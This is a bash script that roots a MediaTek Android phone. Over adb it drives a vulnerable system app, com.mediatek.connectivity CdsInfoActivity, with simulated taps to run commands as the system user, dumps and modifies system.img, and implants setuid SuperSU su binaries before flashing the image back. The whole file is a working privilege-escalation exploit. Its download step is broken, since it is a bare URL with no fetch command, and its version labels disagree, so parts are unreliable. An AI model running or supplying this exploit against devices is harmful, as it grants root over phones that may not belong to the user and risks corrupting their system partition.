#!/bin/bash
#push dump.sh & write.sh
echo "\033[0;31m[1] Pushing dump.sh & write.sh\033[0;39m"
adb push -p dump.sh /data/local/tmp/dump.sh
adb push -p write.sh /data/local/tmp/write.sh
#kill activity if already open
echo "\033[0;31m[2] Opening vulnerable activity and executing commands as uid=1000(system)\033[0;39m"
adb shell am force-stop com.mediatek.connectivity
#open CDS Activity --> each command given through the SHELL is executed with uid=1000(system) gid=1000(system)
adb shell am start -a android.intent.action.MAIN -n com.mediatek.connectivity/com.mediatek.connectivity.CdsInfoActivity >/dev/null
#click "Network Utility"
adb shell input tap 240 375
#click the input TextBox
adb shell input tap 250 160
#execute pushed dump.sh
adb shell input text '/data/local/tmp/dump.sh'
adb shell input tap 80 254
sleep 5
#check if the 'dd' command has finished
echo "\033[0;31m[3] Waiting for system.img dump to complete (it could take a while)\033[0;39m"
temp=""
while [ "$temp" != "FINISHED_DUMP" ]
do
        temp="$(expr substr $(adb shell cat /sdcard/finished_dump | grep FINISHED) 1 13 2>/dev/null)"
        sleep 5s
done
#pull the dumped system.img
echo "\033[0;31m[4] Pulling system.img out of the phone & deleting old copy (it could take a while)\033[0;39m"
adb pull -p  /sdcard/system.img
#remove system.img from the sdcard
adb shell rm /sdcard/system.img
#create the mount directory
echo "\033[0;31m[5] Mounting extrated system.img\033[0;39m"
mkdir system
#mount the dumped system.img
sudo mount system.img ./system -o loop
#download & extract supersu.zip
https://download.chainfire.eu/696/SuperSU/UPDATE-SuperSU-v2.46.zip?retrieve_file=1 > /dev/null
mv UPDATE-* supersu.zip
unzip supersu.zip -d supersu > /dev/null
#copy root files into the mounted image
echo "\033[0;31m[6] Rooting system.img with BETA-SuperSU-2.49 (check fo binary updates after root)\033[0;39m"
sudo cp ./supersu/common/install-recovery.sh ./system/etc/install-recovery.sh
sudo cp ./supersu/armv7/su ./system/xbin/su
sudo cp ./supersu/armv7/su ./system/xbin/daemonsu
sudo chown 0.0 ./system/etc/install-recovery.sh
sudo chown 0.0 ./system/xbin/su
sudo chown 0.0 ./system/xbin/daemonsu
sudo chmod 755 ./system/etc/install-recovery.sh
sudo chmod 06755 ./system/xbin/su
sudo chmod 06755 ./system/xbin/daemonsu
#save the image
echo "\033[0;31m[7] Unmounting system.img and pushing it on the phone as rooted.img\033[0;39m"
sudo umount ./system
#remove temp folders
sudo rm -r system supersu
#push the image on the phone again
adb push -p system.img /sdcard/rooted.img
#click the input TextBox again, just to be sure
echo "\033[0;31m[8] Executing write.sh to flash the rooted image with uid=1000(system)\033[0;39m"
adb shell am force-stop com.mediatek.connectivity
#re-open CDS Activity --> each command given through the SHELL is executed with uid=1000(system) gid=1000(system)
adb shell am start -a android.intent.action.MAIN -n com.mediatek.connectivity/com.mediatek.connectivity.CdsInfoActivity > /dev/null
#click "Network Utility"
adb shell input tap 240 375
#click the input TextBox
adb shell input tap 250 160
#execute pushed write.sh
adb shell input text '/data/local/tmp/write.sh'
adb shell input tap 80 254
#wait the finish of the flash operation
temp=""
while [ "$temp" != "FINISHED_WRITE" ]
do
        temp="$(expr substr $(adb shell cat /sdcard/finished_write | grep FINISHED) 1 14 2>/dev/null)"
        sleep 5s
done
echo "\033[0;31m[9] Waiting 2 minutes & then restarting the phone to confirm root\033[0;39m"
#delete files
adb shell rm /sdcard/rooted.img
adb shell rm /sdcard/finished_write
adb shell rm /sdcard/finished_dump
rm system.img
#wait 2 minutes & then reboot the phone
sleep 2m
adb reboot
